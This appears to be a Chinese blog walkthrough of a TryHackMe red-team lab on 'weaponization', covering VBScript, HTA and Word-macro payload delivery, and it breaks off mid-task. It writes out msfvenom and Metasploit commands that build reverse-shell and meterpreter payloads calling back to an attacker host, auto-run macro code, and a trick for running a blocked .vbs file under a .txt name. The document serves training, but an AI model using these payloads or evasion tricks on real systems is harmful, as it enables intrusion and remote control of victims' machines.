1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-Weaponization</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-07-12T10:37:00.000Z" title="发表于 2024-07-12 18:37:00">2024-07-12</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-01T08:12:34.497Z" title="更新于 2024-08-01 16:12:34">2024-08-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">6.1k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>22分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-Weaponization"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/07/12/thm-weaponization/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/07/12/thm-weaponization/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/07/12/thm-weaponization/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-Weaponization</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-07-12T10:37:00.000Z" title="发表于 2024-07-12 18:37:00">2024-07-12</time><time itemprop="dateCreated datePublished" datetime="2024-08-01T08:12:34.497Z" title="更新于 2024-08-01 16:12:34">2024-08-01</time></header><h1 id="0x01-介绍">0x01 介绍</h1>
<p>在这个房间里，我们将讨论用于武器化的不同技术。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135294.png" alt="image-20240712185929529"></p>
<h2 id="什么是weaponization">什么是Weaponization</h2>
<p>武器化是网络杀伤链模型的第二阶段。在此阶段，攻击者使用可交付的有效负载（例如 Word 文档、PDF 等）生成并开发自己的恶意代码<a target="_blank" rel="noopener" href="https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html">[1]</a>。武器化阶段旨在使用恶意武器来利用目标机器并获得初始访问权限。</p>
<p>大多数组织都运行 Windows 操作系统，这将成为可能的目标。组织的环境策略通常会阻止下载和执行 .exe 文件以避免安全违规。因此，红队成员依赖于构建通过各种渠道发送的自定义有效负载，例如网络钓鱼活动、社会工程、浏览器或软件开发、USB 或 Web 方法。</p>
<p>下图是武器化的示例，其中使用精心制作的自定义 PDF 或 Microsoft Office 文档来传递恶意负载。自定义有效负载配置为连接回红队基础设施的C2环境。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135296.png" alt="image-20240712190642231"></p>
<p>有关红队工具包的更多信息，请访问以下内容：包含所有内容的 <a target="_blank" rel="noopener" href="https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development">GitHub 存储库</a>，包括初始访问、有效负载开发、交付方法等。</p>
<p>大多数组织都会阻止或监视其受控环境中 .exe 文件的执行。因此，红队成员依赖于使用其他技术执行有效负载，例如内置 Windows 脚本技术。因此，本任务重点关注各种流行且有效的脚本编写技术，包括：</p>
<ul>
<li>The Windows Script Host (WSH)</li>
<li>An HTML Application (HTA)</li>
<li>Visual Basic Applications (VBA)</li>
<li>PowerShell (PSH)</li>
</ul>
<p>让我们在下一个任务中部署目标机器，并在后续任务中开始使用Windows Script Host技术！</p>
<h1 id="0x02-部署windows机器">0x02 部署Windows机器</h1>
<p>如果您更喜欢通过远程桌面协议 (RDP) 连接，请首先确保您已连接到 VPN。然后需要 RDP 客户端连接到连接的 Windows 10 计算机。您可以使用 xfreerdp 工具进行连接，该工具可在 TryHackMe AttackBox 上找到。</p>
<p>要通过 xfreerdp 连接，请使用以下命令：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ xfreerdp /<span class="hljs-attribute">v</span>:<span class="hljs-number">10.10</span>.<span class="hljs-number">13.20</span> /<span class="hljs-attribute">u</span>:thm /<span class="hljs-attribute">p</span>:TryHackM3 +clipboard</code></pre>
<p>用户名：thm 密码：TryHackM3</p>
<p>这里我是用GUI的remmina连接</p>
<h1 id="0x03-windows-scripting-host-wsh">0x03 Windows Scripting Host (WSH)</h1>
<h2 id="wsh">WSH</h2>
<p>Windows 脚本主机是一个内置的 Windows 管理工具，它运行批处理文件以自动执行和管理操作系统内的任务。</p>
<p>它是一个Windows本机引擎，cscript.exe（用于命令行脚本）和wscript.exe（用于UI脚本），负责执行各种Microsoft Visual Basic脚本（VBScript），包括vbs和vbe。有关 VBScript 的更多信息，<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/VBScript">请访问此处</a>。需要注意的是，Windows 操作系统上的 VBScript 引擎以与普通用户相同级别的访问和权限来运行和执行应用程序；因此，它对红队队员很有用。</p>
<p>现在让我们编写一个简单的 VBScript 代码来创建一个 Windows 消息框，显示欢迎使用 THM 消息。确保将以下代码保存到文件中，例如 hello.vbs.</p>
<pre><code class="hljs VBSCRIPT"><span class="hljs-keyword">Dim</span> message 
message = <span class="hljs-string">"Welcome to THM"</span>
MsgBox message</code></pre>
<p>在第一行中，我们使用 Dim 声明了消息变量。然后我们在消息变量中存储一个字符串值Welcome to THM。在下一行中，我们使用 MsgBox 函数来显示变量的内容。有关 MsgBox 函数的更多信息，<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/sfw6660x(v=vs.84)?redirectedfrom=MSDN">请访问此处</a>。然后，我们使用wscript来运行并执行hello.vbs的内容，结果，将弹出一条Windows消息，其中包含Welcome to THM消息。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135297.png" alt="image-20240712192801895"></p>
<p>现在让我们使用 VBScript 来运行可执行文件。下面的vbs代码是调用Windows计算器，证明我们可以使用Windows本机引擎（WSH）执行.exe文件。</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Set</span> shell = <span class="hljs-title class_">WScript</span>.<span class="hljs-title class_">CreateObject</span>(<span class="hljs-string">"Wscript.Shell"</span>)
shell.<span class="hljs-title class_">Run</span>(<span class="hljs-string">"C:\Windows\System32\calc.exe "</span> &amp; <span class="hljs-title class_">WScript</span>.<span class="hljs-property">ScriptFullName</span>),<span class="hljs-number">0</span>,<span class="hljs-title class_">True</span></code></pre>
<p>我们使用 CreateObject 创建 WScript 库的对象来调用执行负载。然后，我们利用 Run 方法来执行有效负载。对于此任务，我们将运行 Windows 计算器calc.exe。</p>
<p>要执行 vbs 文件，我们可以使用 wscript 运行它，如下所示，</p>
<pre><code class="hljs scss">c:\Windows\System32&gt;wscript c:\Users\thm\Desktop\payload.vbs</code></pre>
<p>我们还可以通过 cscript 运行它，如下所示，</p>
<pre><code class="hljs scss">c:\Windows\System32&gt;cscript.exe c:\Users\thm\Desktop\payload.vbs</code></pre>
<p>结果，Windows 计算器将出现在桌面上。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135298.png" alt="image-20240712192833105"></p>
<p>另一个技巧。如果VBS文件被列入黑名单，那么我们可以将文件重命名为.txt文件并使用wscript运行它，如下所示，</p>
<pre><code class="hljs scss">c:\Windows\System32&gt;wscript /e:VBScript c:\Users\thm\Desktop\payload.txt</code></pre>
<p>结果将与执行运行 calc.exe 二进制文件的 vbs 文件一样精确。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135299.png" alt="image-20240712193716207"></p>
<h1 id="0x04-an-html-application-hta">0x04 An HTML Application (HTA)</h1>
<h2 id="html-应用程序">HTML 应用程序</h2>
<p>HTA 代表“HTML 应用程序”。它允许您创建一个可下载文件，其中包含有关如何显示和渲染的所有信息。 HTML 应用程序，也称为 HTA，是包含 JScript 和 VBScript 的动态 HTML 页面。 LOLBINS（Living-of-the-land Binaries）工具mshta用于执行HTA文件。它可以自行执行或从 Internet Explorer 自动执行。</p>
<p>在下面的示例中，我们将在有效负载中使用 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ActiveX">ActiveXObject</a> 作为执行 cmd.exe 的概念证明。考虑以下 HTML 代码。</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span>
<span class="language-javascript">	<span class="hljs-keyword">var</span> c= <span class="hljs-string">'cmd.exe'</span></span>
<span class="language-javascript">	<span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">'WScript.Shell'</span>).<span class="hljs-title class_">Run</span>(c);</span>
<span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>然后从Web服务器提供payload.hta，这可以从攻击机器完成，如下所示，</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ python3 -m http.server <span class="hljs-number">8090</span>
Serving HTTP on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> port <span class="hljs-number">8090</span> (<span class="hljs-attribute">http</span>://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8090</span>/)</code></pre>
<p>在受害计算机上，使用 Microsoft Edge 访问恶意链接，<a target="_blank" rel="noopener" href="http://10.8.232.37:8090/payload.hta%E3%80%82%E8%AF%B7%E6%B3%A8%E6%84%8F%EF%BC%8C10.8.232.37">http://10.8.232.37:8090/payload.hta。请注意，10.8.232.37</a> 是 AttackBox 的 IP 地址。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135300.png" alt="image-20240712211341373"></p>
<p>一旦我们按下“运行”，payload.hta 就会被执行，然后它将调用 cmd.exe。下图说明我们已经成功执行了cmd.exe.</p>
<h2 id="hta反向连接">HTA反向连接</h2>
<p>我们可以创建一个反向 shell 有效负载，如下所示：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="hljs-number">10.8</span>.<span class="hljs-number">232.37</span> LPORT=<span class="hljs-number">443</span> -f hta-psh -o thm.hta
[-] No platform was selected, choosing <span class="hljs-attribute">Msf</span>::<span class="hljs-attribute">Module</span>::<span class="hljs-attribute">Platform</span>::Windows from the payload
[-] No arch selected, selecting <span class="hljs-attribute">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload <span class="hljs-attribute">size</span>: <span class="hljs-number">460</span> bytes
Final size of hta-psh <span class="hljs-attribute">file</span>: <span class="hljs-number">7692</span> bytes
Saved <span class="hljs-attribute">as</span>: thm.hta</code></pre>
<p>我们使用 Metasploit 框架中的 msfvenom 生成恶意负载以连接回攻击机器。我们使用以下有效负载将 windows/x64/shell_reverse_tcp 连接到我们的 IP 和侦听端口。</p>
<p>在攻击机上，我们需要使用nc监听443端口。请注意，此端口需要 root 权限才能打开，或者您可以使用不同的权限。</p>
<p>一旦受害者访问恶意 URL 并点击运行，我们就会恢复连接。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135301.png" alt="image-20240712211809835"></p>
<h2 id="通过-metasploit-的恶意-hta">通过 Metasploit 的恶意 HTA</h2>
<p>还有另一种方法可以使用 Metasploit 框架生成和提供恶意 HTA 文件。首先，使用 msfconsole -q 命令运行 Metasploit 框架。在exploit部分下有exploit/windows/misc/hta_server，需要选择并设置LHOST、LPORT、SRVHOST、Payload等信息，最后执行exploit来运行该模块。</p>
<pre><code class="hljs scss">msf6 &gt; use exploit/windows/misc/hta_server
msf6 <span class="hljs-built_in">exploit</span>(windows/misc/hta_server) &gt; set LHOST <span class="hljs-number">10.8</span><span class="hljs-selector-class">.232</span><span class="hljs-selector-class">.37</span>
LHOST =&gt; <span class="hljs-number">10.8</span><span class="hljs-selector-class">.232</span><span class="hljs-selector-class">.37</span>
msf6 <span class="hljs-built_in">exploit</span>(windows/misc/hta_server) &gt; set LPORT <span class="hljs-number">443</span>
LPORT =&gt; <span class="hljs-number">443</span>
msf6 <span class="hljs-built_in">exploit</span>(windows/misc/hta_server) &gt; set SRVHOST <span class="hljs-number">10.8</span><span class="hljs-selector-class">.232</span><span class="hljs-selector-class">.37</span>
SRVHOST =&gt; <span class="hljs-number">10.8</span><span class="hljs-selector-class">.232</span><span class="hljs-selector-class">.37</span>
msf6 <span class="hljs-built_in">exploit</span>(windows/misc/hta_server) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf6 <span class="hljs-built_in">exploit</span>(windows/misc/hta_server) &gt; exploit
<span class="hljs-selector-attr">[*]</span> Exploit running as <span class="hljs-attribute">background</span> job <span class="hljs-number">0</span>.
<span class="hljs-selector-attr">[*]</span> Exploit completed, but no session was created.
msf6 <span class="hljs-built_in">exploit</span>(windows/misc/hta_server) &gt;
<span class="hljs-selector-attr">[*]</span> Started reverse TCP handler on <span class="hljs-number">10.8</span><span class="hljs-selector-class">.232</span><span class="hljs-selector-class">.37</span>:<span class="hljs-number">443</span>
[*] Using URL: http://<span class="hljs-number">10.8</span>.<span class="hljs-number">232.37</span>:<span class="hljs-number">8080</span>/TkWV9zkd.hta
[*] Server started.</code></pre>
<p>在受害计算机上，一旦我们访问 Metasploit 作为 URL 提供的恶意 HTA 文件，我们应该会收到反向连接。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135302.png" alt="image-20240712212611686"></p>
<h1 id="0x05-visual-basic-for-application-vba">0x05 Visual Basic for Application (VBA)</h1>
<h2 id="visual-basic-应用程序-vba">Visual Basic 应用程序 (VBA)</h2>
<p>VBA 代表 Visual Basic for Applications，是 Microsoft 为 Microsoft Word、Excel、PowerPoint 等 Microsoft 应用程序实现的一种编程语言。VBA 编程允许自动执行用户与 Microsoft Office 应用程序之间几乎所有键盘和鼠标交互的任务。</p>
<p>宏是 Microsoft Office 应用程序，其中包含以 Visual Basic for Applications (VBA) 编程语言编写的嵌入式代码。它用于创建自定义函数，通过创建自动化流程来加速手动任务。 VBA 的功能之一是访问 Windows 应用程序编程接口 (<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Windows_API">API</a>) 和其他低级功能。有关 VBA 的更多信息，<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Visual_Basic_for_Applications">请访问此处</a>。</p>
<p>在此任务中，我们将讨论 VBA 的基础知识以及攻击者使用宏创建恶意 Microsoft 文档的方式。要跟进此任务的内容，请确保在任务 2 中部署连接的 Windows 计算机。准备就绪后，即可通过浏览器内访问使用它。</p>
<p>现在从“开始”菜单打开 Microsoft Word 2016。打开后，我们将关闭产品密钥窗口，因为我们将在 7 天的试用期内使用它。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135303.png" alt="image-20240714102127685"></p>
<p>接下来，请确保接受关闭产品密钥窗口后显示的 Microsoft Office 许可协议。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135304.png" alt="image-20240714102827060"></p>
<p>现在创建一个新的空白 Microsoft 文档来创建我们的第一个宏。目标是讨论该语言的基础知识并展示如何在打开 Microsoft Word 文档时运行它。首先，我们需要通过选择“视图”→“宏”来打开 Visual Basic 编辑器。宏窗口显示在文档中创建我们自己的宏。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135305.png" alt="image-20240714102958948"></p>
<p>在宏名称部分，我们选择将宏命名为 THM。请注意，我们需要从列表 Document1 中的宏中进行选择，最后选择创建。接下来，Microsoft Visual Basic for Application 编辑器显示了我们可以在哪里编写 VBA 代码。让我们尝试显示一个消息框，其中包含以下消息：欢迎来到武器化室！。我们可以使用 MsgBox 函数来做到这一点，如下所示：</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Sub</span> <span class="hljs-title function_">THM</span>()
  <span class="hljs-title class_">MsgBox</span> (<span class="hljs-string">"Welcome to Weaponization Room!"</span>)
<span class="hljs-title class_">End</span> <span class="hljs-title class_">Sub</span></code></pre>
<p>最后，按 F5 或 Run → Run Sub/UserForm 运行宏。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135306.png" alt="image-20240714103239190"></p>
<p>现在，为了在文档打开后自动执行 VBA 代码，我们可以使用 AutoOpen 和 Document_open 等内置函数。请注意，我们需要指定文档打开后需要运行的函数名称，在我们的例子中是 THM 函数。</p>
<pre><code class="hljs js"><span class="hljs-title class_">Sub</span> <span class="hljs-title class_">Document</span>_Open()
  <span class="hljs-variable constant_">THM</span>
<span class="hljs-title class_">End</span> <span class="hljs-title class_">Sub</span>

<span class="hljs-title class_">Sub</span> <span class="hljs-title class_">AutoOpen</span>()
  <span class="hljs-variable constant_">THM</span>
<span class="hljs-title class_">End</span> <span class="hljs-title class_">Sub</span>

<span class="hljs-title class_">Sub</span> <span class="hljs-title function_">THM</span>()
   <span class="hljs-title class_">MsgBox</span> (<span class="hljs-string">"Welcome to Weaponization Room!"</span>)
<span class="hljs-title class_">End</span> <span class="hljs-title class_">Sub</span></code></pre>
<p>需要注意的是，为了使宏起作用，我们需要将其保存为启用宏的格式，例如.doc和docm。现在，让我们将文件另存为 Word 97-2003 模板，其中通过转到文件 → 保存 Document1 并保存为类型 → Word 97-2003 文档启用宏，最后保存。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135307.png" alt="image-20240714103632799"></p>
<p>让我们关闭保存的Word文档。如果我们重新打开文档文件，Microsoft Word 将显示一条安全消息，指示宏已被禁用，并为我们提供启用它的选项。让我们启用它并继续检查结果。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135308.png" alt="image-20240714103747457"></p>
<p>一旦我们允许启用内容，我们的宏就会执行，如图所示，</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135309.png" alt="image-20240714103845689"></p>
<p>现在编辑 Word 文档并创建一个执行 calc.exe 或任何可执行文件的宏函数作为概念证明，如下所示，</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Sub</span> <span class="hljs-title class_">PoC</span>()
	<span class="hljs-title class_">Dim</span> payload <span class="hljs-title class_">As</span> <span class="hljs-title class_">String</span>
	payload = <span class="hljs-string">"calc.exe"</span>
	<span class="hljs-title class_">CreateObject</span>(<span class="hljs-string">"Wscript.Shell"</span>).<span class="hljs-property">Run</span> payload,<span class="hljs-number">0</span>
<span class="hljs-title class_">End</span> <span class="hljs-title class_">Sub</span></code></pre>
<p>为了详细解释代码，我们使用 Dim 关键字将有效负载变量声明为字符串。使用payload =“calc.exe”，我们指定有效负载名称，最后使用CreateObject(“Wscript.Shell”).Run有效负载，我们创建一个Windows脚本主机(WSH)对象并运行有效负载。请注意，如果要重命名函数名称，则必须在 AutoOpen() 和 Document_open() 函数中也包含该函数名称。</p>
<p>确保在使用编辑器中的运行功能保存文档之前测试您的代码。确保在保存文档之前创建 AutoOpen() 和 Document_open() 函数。代码运行后，现在保存文件并尝试再次打开它。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135310.png" alt="image-20240714104717526"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135311.png" alt="image-20240714104651982"></p>
<p>值得一提的是，我们可以将 VBA 与之前介绍的方法（例如 HTA 和 WSH）结合起来。 VBA/宏本身不会绕过任何检测。</p>
<p>现在让我们使用 Metasploit 框架创建一个内存中的 meterpreter 有效负载来接收反向 shell。首先，从 AttackBox 中，我们使用 msfvenom 创建 meterpreter 有效负载。我们需要指定 PayloadLHOST 和 LPORT，它们与 Metasploit 框架中的内容相匹配。请注意，我们将有效负载指定为 VBA 以将其用作宏。</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=xx LPORT=xxx -f vba</code></pre>
<p>输出如下。</p>
<p>上述终端中 LHOST 的值是我们使用的 AttackBox IP 地址的示例。对于您的情况，您需要指定 AttackBox 的 IP 地址。</p>
<p>导入时请注意，需要进行一项修改才能使其工作。输出将在 MS Excel 工作表上运行。因此，将 Workbook_Open() 更改为 Document_Open() 以使其适合 MS Word 文档。</p>
<p>现在复制输出并将其保存到 MS Word 文档的宏编辑器中，如我们之前所示。在攻击机器上，运行 Metasploit 框架并设置监听器，如下所示：</p>
